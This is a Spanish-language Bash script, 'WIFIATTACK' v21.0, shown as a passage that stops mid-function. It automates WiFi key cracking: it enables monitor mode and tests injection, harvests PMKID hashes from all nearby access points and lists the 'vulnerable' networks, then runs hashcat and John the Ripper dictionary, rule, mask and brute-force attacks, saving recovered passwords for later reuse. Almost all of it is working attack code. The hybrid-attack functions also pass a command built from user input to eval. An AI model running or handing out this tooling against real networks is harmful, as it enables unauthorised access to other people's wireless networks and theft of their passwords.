#!/bin/bash

# =============================================================================
# Script para auditoría WiFi
# Versión 21.0 - Diccionario inteligente y persistente
# Autor: N2O
# =============================================================================


show_banner() {
    local GREEN='\033[38;2;57;255;20m'
    local CYAN='\033[0;96m'
    local NC='\033[0m'

    echo ""
    echo -e "${GREEN}"
    echo "██╗    ██╗██╗███████╗██╗ █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
    echo "██║    ██║██║██╔════╝██║██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
    echo "██║ █╗ ██║██║█████╗  ██║███████║   ██║      ██║   ███████║██║     █████╔╝ "
    echo "██║███╗██║██║██╔══╝  ██║██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
    echo "╚███╔███╔╝██║██║     ██║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
    echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${CYAN}                   📶 WIFIATTACK - The Wireless Arsenal 📶                ${GREEN}║${NC}"
    echo -e "${GREEN}║${CYAN}                             v21.0 | by N2O                               ${GREEN}║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

#Mostrar banner
show_banner

# Colores para mensajes
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

print_msg()   { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_error()   { echo -e "${RED}[!]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_info()    { echo -e "${CYAN}[i]${NC} $1"; }

# =============================================================================
# VARIABLES GLOBALES
# =============================================================================
INTERFACE=""
MON_INTERFACE=""
ORIGINAL_MAC=""
TEMP_FILES=()
SELECTED_SSID=""
SELECTED_BSSID=""
SELECTED_CHANNEL=""
SELECTED_ENCRYPTION=""
USE_GUI_TERMINAL=false
TERMINAL_CMD=""
TERMINAL_CLASS=""
ORIGINAL_USER="${SUDO_USER:-$USER}"
AIRODUMP_PID=""
TEMP_DIR="/tmp/wifi_audit_$$"
SCAN_BASE="${TEMP_DIR}/scan_$$"
mkdir -p "$TEMP_DIR" 2>/dev/null
EXTRA_PIDS=()
OUTPUT_DIR=""
HASH_FILE=""
REPORT_FILE=""
_CLEANUP_DONE=0

# Directorios persistentes (relativos al script)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="$SCRIPT_DIR/.wifi_audit_data"
DICT_DIR="$SCRIPT_DIR/Diccionarios"
HASH_DIR="$SCRIPT_DIR/hashes"

mkdir -p "$WORK_DIR" "$DICT_DIR" "$HASH_DIR"

FOUND_PASSWORDS="$WORK_DIR/found_pass.txt"
CRACKED_POT="$WORK_DIR/cracked_hashes.pot"
CUSTOM_DICT="$WORK_DIR/My_Pwnedpass.txt"

touch "$FOUND_PASSWORDS" "$CRACKED_POT" "$CUSTOM_DICT"

# Cambiar propietario al usuario original (si no es root)
if [ -n "$ORIGINAL_USER" ] && [ "$ORIGINAL_USER" != "root" ]; then
    chown -R "$ORIGINAL_USER":"$ORIGINAL_USER" "$WORK_DIR" "$DICT_DIR" "$HASH_DIR" 2>/dev/null
fi

# =============================================================================
# FUNCIONES AUXILIARES
# =============================================================================

sanitize_name() {
    echo "$1" | sed 's/[^a-zA-Z0-9_-]/_/g'
}

detect_gui_terminal() {
    if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
        if command -v gnome-terminal &>/dev/null; then
            TERMINAL_CMD="gnome-terminal --"
            TERMINAL_CLASS="Gnome-terminal"
            USE_GUI_TERMINAL=true
        elif command -v xterm &>/dev/null; then
            TERMINAL_CMD="xterm -e"
            TERMINAL_CLASS="XTerm"
            USE_GUI_TERMINAL=true
        elif command -v konsole &>/dev/null; then
            TERMINAL_CMD="konsole -e"
            TERMINAL_CLASS="konsole"
            USE_GUI_TERMINAL=true
        elif command -v terminator &>/dev/null; then
            TERMINAL_CMD="terminator -e"
            TERMINAL_CLASS="Terminator"
            USE_GUI_TERMINAL=true
        fi
    fi
}

apply_bspwm_floating_rule() {
    if command -v bspc &>/dev/null && [ -n "$TERMINAL_CLASS" ] && [ -n "$ORIGINAL_USER" ]; then
        sudo -u "$ORIGINAL_USER" bspc rule -a "$TERMINAL_CLASS" state=floating once
    fi
}

get_monitor_interface() {
    local phys_iface="$1"
    local mon_iface=""
    
    airmon-ng start "$phys_iface" > /dev/null 2>&1
    sleep 2
    
    mon_iface=$(iw dev 2>/dev/null | awk -v iface="$phys_iface" '
        /Interface/ {current=$2}
        /type monitor/ && current ~ iface {print current; exit}
    ')
    
    if [ -z "$mon_iface" ]; then
        for candidate in "${phys_iface}mon" "mon0" "mon1"; do
            if iw dev "$candidate" info &>/dev/null; then
                mon_iface="$candidate"
                break
            fi
        done
    fi
    
    echo "$mon_iface"
}

check_injection() {
    print_msg "Verificando capacidad de inyección en $MON_INTERFACE..."
    if aireplay-ng -9 "$MON_INTERFACE" 2>&1 | grep -q "Injection is working"; then
        print_success "Inyección OK."
        return 0
    else
        print_error "La tarjeta no puede inyectar. Prueba con otra interfaz o controladores."
        return 1
    fi
}

check_pmf_enabled() {
    local bssid="$1"
    local channel="$2"
    local mon_iface="$3"
    local pmf_detected=1
    local temp_cap="${TEMP_DIR}/pmf_check"
    
    if ! command -v tshark &>/dev/null; then
        print_warning "tshark no instalado. No se puede verificar PMF."
        return 1
    fi
    
    print_msg "Analizando beacon frames para detectar PMF (máx 10s)..."
    
    airodump-ng -c "$channel" --bssid "$bssid" -w "$temp_cap" "$mon_iface" > /dev/null 2>&1 &
    local airodump_pid=$!
    
    local count=0
    while [ $count -lt 10 ]; do
        sleep 1
        if [ -f "${temp_cap}-01.cap" ] && [ -s "${temp_cap}-01.cap" ]; then
            kill "$airodump_pid" 2>/dev/null
            wait "$airodump_pid" 2>/dev/null
            break
        fi
        count=$((count+1))
    done
    
    if kill -0 "$airodump_pid" 2>/dev/null; then
        kill "$airodump_pid" 2>/dev/null
        wait "$airodump_pid" 2>/dev/null
        print_warning "No se pudo capturar beacon (tiempo agotado)."
        return 1
    fi
    
    if [ ! -f "${temp_cap}-01.cap" ] || [ ! -s "${temp_cap}-01.cap" ]; then
        print_warning "Archivo de captura vacío o no generado."
        return 1
    fi
    
    if timeout 5 tshark -r "${temp_cap}-01.cap" -Y "wlan.rsn.capabilities.pmf_required == 1 or wlan.rsn.capabilities.pmf_capable == 1" 2>/dev/null | grep -q .; then
        print_warning "El AP anuncia soporte de PMF (802.11w)."
        pmf_detected=0
    else
        print_success "El AP no parece tener PMF activado."
    fi
    
    rm -f "${temp_cap}-01.cap"
    return $pmf_detected
}

get_network_info_from_csv() {
    local csv_file="$1"
    local essid="$2"
    local channel="$3"
    local bssid=""
    local encryption=""
    
    result=$(awk -F',' -v essid="$essid" -v chan="$channel" '
        NR>2 && $14 ~ essid && $4 ~ chan {
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6);
            print $1 "|" $6;
            exit;
        }' "$csv_file")
    
    if [ -n "$result" ]; then
        bssid=$(echo "$result" | cut -d'|' -f1)
        encryption=$(echo "$result" | cut -d'|' -f2)
    fi
    
    echo "$bssid|$encryption"
}

detect_wpa3() {
    local encryption="$1"
    if echo "$encryption" | grep -qi "WPA3\|SAE\|OWE"; then
        return 0
    else
        return 1
    fi
}

detect_transition_mode() {
    local encryption="$1"
    if echo "$encryption" | grep -qi "WPA2.*WPA3\|WPA3.*WPA2"; then
        return 0
    else
        return 1
    fi
}

kill_airodump() {
    local pid="$1"
    local name="$2"
    if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
        kill "$pid" 2>/dev/null
        wait "$pid" 2>/dev/null
    fi
    pkill -f "airodump-ng.*$name" 2>/dev/null
}

restore_network() {
    print_msg "Restaurando configuración de red..."

    if [ -n "$MON_INTERFACE" ] && [ "$MON_INTERFACE" != "$INTERFACE" ] && iw dev 2>/dev/null | grep -q "$MON_INTERFACE"; then
        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
    fi

    if [ -n "$INTERFACE" ]; then
        ip link set "$INTERFACE" down
        macchanger -p "$INTERFACE" > /dev/null 2>&1
        ip link set "$INTERFACE" up
    fi

    systemctl start NetworkManager 2>/dev/null || service network-manager start 2>/dev/null

    print_success "Red restaurada."
}

scan_for_pmkid() {
    local scan_time="$1"
    local output_pcap="${OUTPUT_DIR}/pmkid_scan_$$.pcapng"
    local report_file="${OUTPUT_DIR}/redes_vulnerables_$(date +%Y%m%d_%H%M%S).txt"
    local log_file="/tmp/pmkid_output_$$.log"
    
    local output_opt="-o"
    if hcxdumptool --help 2>&1 | grep -q -- "--output"; then
        output_opt="--output"
    fi
    
    print_msg "Iniciando escaneo de redes vulnerables (PMKID)..."
    print_info "Escaneando durante $scan_time segundos. Presiona Ctrl+C para detener antes."
    
    timeout "$scan_time" hcxdumptool -i "$MON_INTERFACE" "$output_opt" "$output_pcap" --enable_status=1 > "$log_file" 2>&1
    
    echo "=== REDES VULNERABLES A PMKID ===" > "$report_file"
    echo "Fecha: $(date)" >> "$report_file"
    echo "Interfaz: $MON_INTERFACE" >> "$report_file"
    echo "" >> "$report_file"
    
    grep -i "FOUND PMKID" "$log_file" | while read line; do
        ap_bssid=$(echo "$line" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
        if [ -n "$ap_bssid" ]; then
            echo "[VULNERABLE] AP: $ap_bssid" >> "$report_file"
        fi
    done
    
    if [ -f "$output_pcap" ] && [ -s "$output_pcap" ]; then
        hcxpcapngtool -o "${OUTPUT_DIR}/pmkid_hashes.22000" "$output_pcap" > /dev/null 2>&1
        print_success "Archivo con hashes PMKID guardado: ${OUTPUT_DIR}/pmkid_hashes.22000"
    else
        print_warning "No se generó archivo de captura válido."
    fi
    
    print_success "Escaneo completado. Reporte guardado en: $report_file"
    
    vulnerable_count=$(grep -c "^\[VULNERABLE\]" "$report_file")
    print_info "Se encontraron $vulnerable_count redes vulnerables."
    
    rm -f "$log_file"
    TEMP_FILES+=("$log_file")
}

record_found_password() {
    local password="$1"
    if ! grep -qxF "$password" "$FOUND_PASSWORDS"; then
        echo "$password" >> "$FOUND_PASSWORDS"
        print_success "Contraseña añadida al repositorio persistente: $FOUND_PASSWORDS"
    fi
    if ! grep -qxF "$password" "$CUSTOM_DICT"; then
        echo "$password" >> "$CUSTOM_DICT"
        print_success "Contraseña añadida al diccionario personal: $CUSTOM_DICT"
    fi
    local auto_dict="$DICT_DIR/auto_aprendidas.txt"
    if ! grep -qxF "$password" "$auto_dict" 2>/dev/null; then
        echo "$password" >> "$auto_dict"
        print_success "Contraseña añadida a $auto_dict"
    fi
}

record_cracked_hash() {
    local hash_line="$1"
    echo "$hash_line" >> "$CRACKED_POT"
}

# =============================================================================
# FUNCIONES DE DICCIONARIO Y CRACKING
# =============================================================================

prepare_wordlist() {
    # Todos los mensajes a stderr para que se muestren
    echo "" >&2
    print_msg "Selecciona el diccionario:" >&2
    echo "  1. rockyou.txt (por defecto)" >&2
    echo "  2. Diccionario personal ($CUSTOM_DICT)" >&2
    echo "  3. Contraseñas ya encontradas ($FOUND_PASSWORDS)" >&2
    echo "  4. Diccionario de la carpeta personal ($DICT_DIR)" >&2
    echo "  5. Otro (especificar ruta)" >&2
    read -p "Opción (1-5): " dict_choice >&2

    local wordlist=""
    case "$dict_choice" in
        1)
            wordlist="/usr/share/wordlists/rockyou.txt"
            if [ ! -f "$wordlist" ]; then
                if [ -f "${wordlist}.gz" ]; then
                    print_msg "Descomprimiendo rockyou.txt.gz..." >&2
                    gunzip -c "${wordlist}.gz" > "$wordlist"
                else
                    print_error "rockyou.txt no encontrado." >&2
                    return 1
                fi
            fi
            ;;
        2)
            wordlist="$CUSTOM_DICT"
            if [ ! -f "$wordlist" ]; then
                touch "$wordlist"
                print_info "Creado diccionario personal vacío: $wordlist" >&2
            fi
            ;;
        3)
            wordlist="$FOUND_PASSWORDS"
            if [ ! -s "$wordlist" ]; then
                print_warning "Aún no hay contraseñas encontradas. El diccionario está vacío." >&2
            fi
            ;;
        4)
            local dict_files=("$DICT_DIR"/*.txt)
            if [ ! -e "${dict_files[0]}" ]; then
                print_error "No hay diccionarios en $DICT_DIR. Añade archivos .txt y vuelve a intentarlo." >&2
                return 1
            fi
            echo "" >&2
            print_msg "Diccionarios disponibles en $DICT_DIR:" >&2
            local i=1
            for f in "${dict_files[@]}"; do
                echo "  $i. $(basename "$f")" >&2
                ((i++))
            done
            read -p "Selecciona el número (1-${#dict_files[@]}): " file_num >&2
            if [[ "$file_num" =~ ^[0-9]+$ ]] && [ "$file_num" -ge 1 ] && [ "$file_num" -le ${#dict_files[@]} ]; then
                wordlist="${dict_files[$((file_num-1))]}"
            else
                print_error "Número inválido." >&2
                return 1
            fi
            ;;
        5)
            read -p "Introduce la ruta al diccionario: " wordlist >&2
            if [ ! -f "$wordlist" ]; then
                print_error "Archivo no encontrado." >&2
                return 1
            fi
            ;;
        *)
            print_error "Opción inválida." >&2
            return 1
            ;;
    esac

    read -p "¿Filtrar por longitud? (s/N): " -n 1 -r filter_choice >&2
    echo >&2
    if [[ "$filter_choice" =~ ^[Ss]$ ]]; then
        read -p "Longitud mínima (defecto 1): " min_len >&2
        min_len=${min_len:-1}
        read -p "Longitud máxima (defecto 63): " max_len >&2
        max_len=${max_len:-63}
        
        local filtered="${TEMP_DIR}/diccionario_filtrado_$$.txt"
        print_msg "Filtrando palabras de longitud $min_len a $max_len..." >&2
        awk -v min="$min_len" -v max="$max_len" 'length >= min && length <= max' "$wordlist" > "$filtered"
        if [ ! -s "$filtered" ]; then
            print_warning "El filtro no produjo resultados. Se usará el diccionario original." >&2
            rm -f "$filtered"
        else
            wordlist="$filtered"
            TEMP_FILES+=("$filtered")
        fi
    fi

    # Solo la ruta del diccionario se envía a stdout
    echo "$wordlist"
}

get_rule_path() {
    local rule_name="$1"
    local locations=(
        "/usr/share/hashcat/rules/$rule_name"
        "/usr/share/hashcat/rules/$rule_name.rule"
        "./rules/$rule_name"
        "./$rule_name"
    )
    for loc in "${locations[@]}"; do
        if [ -f "$loc" ]; then
            echo "$loc"
            return 0
        fi
    done
    return 1
}

process_hashcat_result() {
    local hashcat_out="$1"
    local out_dir="$2"
    local ssid="$3"
    local hash_file="$4"

    if [ -s "$hashcat_out" ]; then
        local password
        password=$(cut -d: -f2 "$hashcat_out" | head -1)
        print_success "¡Contraseña encontrada: $password!"
        local pass_file="${out_dir}/clave_${ssid}.txt"
        echo "$password" > "$pass_file"
        print_success "Contraseña guardada en: $pass_file"
        
        record_found_password "$password"
        
        if [ -n "$hash_file" ] && [ -f "$hash_file" ]; then
            local hash_value
            hash_value=$(head -1 "$hash_file")
            record_cracked_hash "${hash_value}:${password}"
        fi

        rm -f "$hashcat_out"
        return 0
    else
        print_warning "No se encontró la contraseña."
        rm -f "$hashcat_out"
        return 1
    fi
}

run_hashcat_dict() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi
    
    local wordlist
    wordlist=$(prepare_wordlist) || return 1
    if [ ! -s "$wordlist" ]; then
        print_error "El diccionario $wordlist está vacío o no existe."
        return 1
    fi
    
    print_msg "Iniciando hashcat con diccionario $(basename "$wordlist") (modo $mode)..."
    print_info "Esto puede tardar mucho. Presiona Ctrl+C para cancelar."

    local hashcat_out="${out_dir}/hashcat_dict_$$.log"
    hashcat -m "$mode" -a 0 "$hash_file" "$wordlist" --force -o "$hashcat_out" --potfile-disable --outfile-format=2 --potfile-path="$CRACKED_POT" 2>/dev/null

    process_hashcat_result "$hashcat_out" "$out_dir" "$ssid" "$hash_file"
}

run_hashcat_dict_rule() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    local rule_name="$5"
    local rule_path="$6"

    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi

    local wordlist
    wordlist=$(prepare_wordlist) || return 1
    if [ ! -s "$wordlist" ]; then
        print_error "El diccionario $wordlist está vacío o no existe."
        return 1
    fi

    if [ -z "$rule_path" ]; then
        rule_path=$(get_rule_path "$rule_name")
        if [ -z "$rule_path" ]; then
            print_error "Regla $rule_name no encontrada."
            read -p "Introduce la ruta al archivo de reglas: " rule_path
            [ ! -f "$rule_path" ] && { print_error "Archivo no encontrado."; return 1; }
        fi
    fi

    print_msg "Iniciando hashcat con diccionario $(basename "$wordlist") y reglas $(basename "$rule_path") (modo $mode)..."
    print_info "Esto puede tardar mucho. Presiona Ctrl+C para cancelar."

    local hashcat_out="${out_dir}/hashcat_dict_rule_$$.log"
    hashcat -m "$mode" -a 0 "$hash_file" "$wordlist" -r "$rule_path" --force -o "$hashcat_out" --potfile-disable --outfile-format=2 --potfile-path="$CRACKED_POT" 2>/dev/null

    process_hashcat_result "$hashcat_out" "$out_dir" "$ssid" "$hash_file"
}

run_hashcat_mask() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi
    
    echo ""
    print_msg "=== ATAQUE DE MÁSCARA ==="
    print_info "Placeholders: ?l (minúscula), ?u (mayúscula), ?d (dígito), ?s (especial), ?a (todos)"
    read -p "Introduce la máscara (ej. ?u?l?l?l?d?d): " mask
    if [ -z "$mask" ]; then
        print_error "Máscara vacía. Cancelando."
        return 1
    fi
    
    print_msg "Iniciando hashcat con máscara '$mask' (modo $mode)..."
    local hashcat_out="${out_dir}/hashcat_mask_$$.log"
    hashcat -m "$mode" -a 3 "$hash_file" "$mask" --force -o "$hashcat_out" --potfile-disable --outfile-format=2 --potfile-path="$CRACKED_POT" 2>/dev/null

    process_hashcat_result "$hashcat_out" "$out_dir" "$ssid" "$hash_file"
}

run_hashcat_incremental() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi
    
    echo ""
    print_msg "=== FUERZA BRUTA INCREMENTAL ==="
    read -p "Longitud mínima (defecto 1): " min_len
    min_len=${min_len:-1}
    read -p "Longitud máxima (defecto 8): " max_len
    max_len=${max_len:-8}
    read -p "Juego de caracteres (defecto ?a = todos): " charset
    charset=${charset:-?a}
    
    local mask=""
    for ((i=1; i<=max_len; i++)); do
        mask="${mask}${charset}"
    done
    
    print_msg "Iniciando hashcat incremental de $min_len a $max_len con charset '$charset'..."
    local hashcat_out="${out_dir}/hashcat_inc_$$.log"
    hashcat -m "$mode" -a 3 "$hash_file" "$mask" --increment --increment-min "$min_len" --increment-max "$max_len" --force -o "$hashcat_out" --potfile-disable --outfile-format=2 --potfile-path="$CRACKED_POT" 2>/dev/null

    process_hashcat_result "$hashcat_out" "$out_dir" "$ssid" "$hash_file"
}

run_hashcat_hybrid_wordlist_mask() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi
    
    echo ""
    print_msg "=== ATAQUE HÍBRIDO: DICCIONARIO + MÁSCARA (modo -a 6) ==="
    
    local wordlist
    wordlist=$(prepare_wordlist) || return 1
    if [ ! -s "$wordlist" ]; then
        print_error "El diccionario $wordlist está vacío o no existe."
        return 1
    fi

    print_info "Placeholders: ?l (minúscula), ?u (mayúscula), ?d (dígito), ?s (especial), ?a (todos)"
    read -p "Introduce la máscara a AÑADIR después de cada palabra (ej. ?d?d?d?d): " mask
    [ -z "$mask" ] && { print_error "Máscara vacía."; return 1; }
    
    read -p "¿Usar incremento en la máscara? (s/N): " -n 1 -r use_inc
    echo
    inc_params=""
    if [[ "$use_inc" =~ ^[Ss]$ ]]; then
        read -p "Longitud mínima de la máscara (defecto 1): " inc_min
        inc_min=${inc_min:-1}
        read -p "Longitud máxima de la máscara (defecto 4): " inc_max
        inc_max=${inc_max:-4}
        inc_params="--increment --increment-min=$inc_min --increment-max=$inc_max"
    fi
    
    print_msg "Iniciando ataque híbrido (diccionario + máscara). Esto puede tardar..."
    local hashcat_out="${out_dir}/hashcat_hybrid_wl_mask_$$.log"
    cmd="hashcat -m $mode -a 6 $hash_file $wordlist $mask $inc_params --force -o $hashcat_out --potfile-disable --outfile-format=2 --potfile-path='$CRACKED_POT' 2>/dev/null"
    eval "$cmd"

    process_hashcat_result "$hashcat_out" "$out_dir" "$ssid" "$hash_file"
}

run_hashcat_hybrid_mask_wordlist() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi
    
    echo ""
    print_msg "=== ATAQUE HÍBRIDO: MÁSCARA + DICCIONARIO (modo -a 7) ==="
    
    local wordlist
    wordlist=$(prepare_wordlist) || return 1
    if [ ! -s "$wordlist" ]; then
        print_error "El diccionario $wordlist está vacío o no existe."
        return 1
    fi

    print_info "Placeholders: ?l (minúscula), ?u (mayúscula), ?d (dígito), ?s (especial), ?a (todos)"
    read -p "Introduce la máscara a ANTEPONER a cada palabra (ej. ?d?d?d?d): " mask
    [ -z "$mask" ] && { print_error "Máscara vacía."; return 1; }
    
    read -p "¿Usar incremento en la máscara? (s/N): " -n 1 -r use_inc
    echo
    inc_params=""
    if [[ "$use_inc" =~ ^[Ss]$ ]]; then
        read -p "Longitud mínima de la máscara (defecto 1): " inc_min
        inc_min=${inc_min:-1}
        read -p "Longitud máxima de la máscara (defecto 4): " inc_max
        inc_max=${inc_max:-4}
        inc_params="--increment --increment-min=$inc_min --increment-max=$inc_max"
    fi
    
    print_msg "Iniciando ataque híbrido (máscara + diccionario). Esto puede tardar..."
    local hashcat_out="${out_dir}/hashcat_hybrid_mask_wl_$$.log"
    cmd="hashcat -m $mode -a 7 $hash_file $wordlist $mask $inc_params --force -o $hashcat_out --potfile-disable --outfile-format=2 --potfile-path='$CRACKED_POT' 2>/dev/null"
    eval "$cmd"

    process_hashcat_result "$hashcat_out" "$out_dir" "$ssid" "$hash_file"
}

run_john() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    if [ ! -s "$hash_file" ]; then
        print_error "El archivo de hash está vacío o no existe: $hash_file"
        return 1
    fi
    
    if ! command -v john &>/dev/null; then
        print_error "john no está instalado. Instálalo con: sudo apt install john"
        return 1
    fi
    
    print_msg "Iniciando John the Ripper en modo incremental..."
    print_info "Esto puede tardar mucho. Presiona Ctrl+C para cancelar."
    
    local john_pot="${out_dir}/john_${ssid}.pot"
    john --incremental --format=wpapsk "$hash_file" --pot="$john_pot"
    
    if [ -s "$john_pot" ]; then
        local password
        password=$(john --show --format=wpapsk "$hash_file" | head -1 | cut -d: -f2)
        print_success "¡Contraseña encontrada: $password!"
        local pass_file="${out_dir}/clave_${ssid}.txt"
        echo "$password" > "$pass_file"
        print_success "Contraseña guardada en: $pass_file"
        record_found_password "$password"
    else
        print_warning "John no encontró la contraseña."
    fi
}

cracking_menu() {
    local hash_file="$1"
    local mode="$2"
    local out_dir="$3"
    local ssid="$4"
    
    while true; do
        echo ""
        print_msg "=== MENÚ DE CRACKING ==="
        echo "  1. Diccionario (sin reglas)"
        echo "  2. Diccionario + best64.rule"
        echo "  3. Diccionario + OneRuleToRuleThemAll.rule"
        echo "  4. Diccionario + dive.rule"
        echo "  5. Diccionario + regla personalizada"
        echo "  6. Ataque de máscara"
        echo "  7. Fuerza bruta incremental"
        echo "  8. John the Ripper (incremental)"
        echo "  9. 🔥 Híbrido: Diccionario + Máscara"
        echo " 10. 🔥 Híbrido: Máscara + Diccionario"
        echo " 11. Volver"
        echo " 12. Mostrar ayuda detallada"
        read -p "Selecciona (1-12): " crack_choice
        
        case "$crack_choice" in
            1) run_hashcat_dict "$hash_file" "$mode" "$out_dir" "$ssid" ;;
            2) run_hashcat_dict_rule "$hash_file" "$mode" "$out_dir" "$ssid" "best64.rule" ;;
            3) run_hashcat_dict_rule "$hash_file" "$mode" "$out_dir" "$ssid" "OneRuleToRuleThemAll.rule" ;;
            4) run_hashcat_dict_rule "$hash_file" "$mode" "$out_dir" "$ssid" "dive.rule" ;;
            5)
                read -p "Ruta de la regla: " custom_rule
                [ -f "$custom_rule" ] && run_hashcat_dict_rule "$hash_file" "$mode" "$out_dir" "$ssid" "" "$custom_rule" || print_error "No encontrado."
                ;;
            6) run_hashcat_mask "$hash_file" "$mode" "$out_dir" "$ssid" ;;
            7) run_hashcat_incremental "$hash_file" "$mode" "$out_dir" "$ssid" ;;
            8) run_john "$hash_file" "$mode" "$out_dir" "$ssid" ;;
            9) run_hashcat_hybrid_wordlist_mask "$hash_file" "$mode" "$out_dir" "$ssid" ;;
            10) run_hashcat_hybrid_mask_wordlist "$hash_file" "$mode" "$out_dir" "$ssid" ;;
            11) break ;;
            12)
                echo ""
                print_msg "=== AYUDA DEL MENÚ DE CRACKING ==="
                echo "1. Diccionario simple: prueba todas las palabras de un archivo (ej. rockyou.txt)."
                echo "   Recomendado: primer ataque."
                echo "2. Diccionario + best64.rule: aplica 64 reglas comunes (añadir números, capitalizar)."
                echo "   Muy rápido, descubre muchas variantes."
                echo "3. Diccionario + OneRuleToRuleThemAll.rule: conjunto completo de reglas."
                echo "   Útil cuando best64 no funciona."
                echo "4. Diccionario + dive.rule: otro conjunto popular."
                echo "5. Regla personalizada: especifica tu propio archivo .rule."
                echo "6. Ataque de máscara: defines un patrón con placeholders:"
                echo "   ?l (minúscula), ?u (mayúscula), ?d (dígito), ?s (símbolo), ?a (todos)."
                echo "   Ejemplo: ?u?l?l?l?d?d  (May+3min+2díg)."
                echo "7. Fuerza bruta incremental: prueba longitudes de 1 a N con charset elegido."
                echo "   Útil para claves cortas (1-6 caracteres)."
                echo "8. John the Ripper: modo incremental, alternativa a hashcat."
                echo "9. Híbrido diccionario+máscara: añade sufijos a cada palabra (ej. password123)."
                echo "10. Híbrido máscara+diccionario: antepone prefijos (ej. 123password)."
                echo "11. Volver."
                echo ""
                echo "Consejo: usa el filtro por longitud para reducir el espacio de búsqueda."
                ;;
            *) print_error "Opción inválida." ;;
        esac
    done
}

# =============================================================================
# GESTOR DE DICCIONARIOS
# =============================================================================
gestionar_diccionarios() {
    while true; do
        echo ""
        print_msg "=== GESTOR DE DICCIONARIOS ==="
        echo "  1. Listar diccionarios disponibles"
        echo "  2. Ver estadísticas de un diccionario"
        echo "  3. Fusionar dos diccionarios"
        echo "  4. Limpiar duplicados en un diccionario"
        echo "  5. Ver contraseñas más comunes en found_passwords"
        echo "  6. Volver al menú principal"
        read -p "Selecciona (1-6): " dict_mgmt_choice

        case "$dict_mgmt_choice" in
            1)
                echo ""
                print_msg "Diccionarios en sistema:"
                echo "  - $FOUND_PASSWORDS (encontradas)"
                echo "  - $CUSTOM_DICT (personal)"
                echo "  - $CRACKED_POT (pot de hashcat)"
                echo ""
                print_msg "Diccionarios en $DICT_DIR:"
                if [ -d "$DICT_DIR" ]; then
                    ls -1 "$DICT_DIR"/*.txt 2>/dev/null | sed 's/^/  - /' || echo "  (ninguno)"
                else
                    echo "  (directorio no existe)"
                fi
                echo ""
                print_msg "Diccionarios del sistema:"
                ls -1 /usr/share/wordlists/*.txt 2>/dev/null | head -5 | sed 's/^/  - /'
                echo "  ... (puedes explorar /usr/share/wordlists/)"
                ;;
            2)
                read -p "Introduce la ruta del diccionario: " dict_stats
                if [ ! -f "$dict_stats" ]; then
                    print_error "Archivo no encontrado."
                    continue
                fi
                local total=$(wc -l < "$dict_stats")
                local unicos=$(sort -u "$dict_stats" | wc -l)
                local mins=$(awk '{ if (length < min || min==0) min=length } END { print min+0 }' "$dict_stats")
                local maxs=$(awk '{ if (length > max) max=length } END { print max+0 }' "$dict_stats")
                print_success "Estadísticas de $(basename "$dict_stats"):"
                echo "  Líneas totales: $total"
                echo "  Líneas únicas: $unicos"
                echo "  Longitud mínima: $mins"
                echo "  Longitud máxima: $maxs"
                ;;
            3)
                read -p "Ruta del primer diccionario: " dict1
                read -p "Ruta del segundo diccionario: " dict2
                read -p "Ruta de salida para la fusión: " dict_out
                if [ ! -f "$dict1" ] || [ ! -f "$dict2" ]; then
                    print_error "Uno de los archivos no existe."
                    continue
                fi
                print_msg "Fusionando y eliminando duplicados..."
                cat "$dict1" "$dict2" | sort -u > "$dict_out"
                print_success "Diccionario fusionado creado en: $dict_out"
                ;;
            4)
                read -p "Ruta del diccionario a limpiar: " dict_in
                if [ ! -f "$dict_in" ]; then
                    print_error "Archivo no encontrado."
                    continue
                fi
                read -p "Ruta de salida (puede ser el mismo): " dict_out
                print_msg "Eliminando duplicados..."
                sort -u "$dict_in" > "$dict_out"
                print_success "Diccionario limpio guardado en: $dict_out"
                ;;
            5)
                if [ ! -s "$FOUND_PASSWORDS" ]; then
                    print_warning "Aún no hay contraseñas encontradas."
                    continue
                fi
                print_msg "10 contraseñas más comunes en found_passwords:"
                sort "$FOUND_PASSWORDS" | uniq -c | sort -nr | head -10
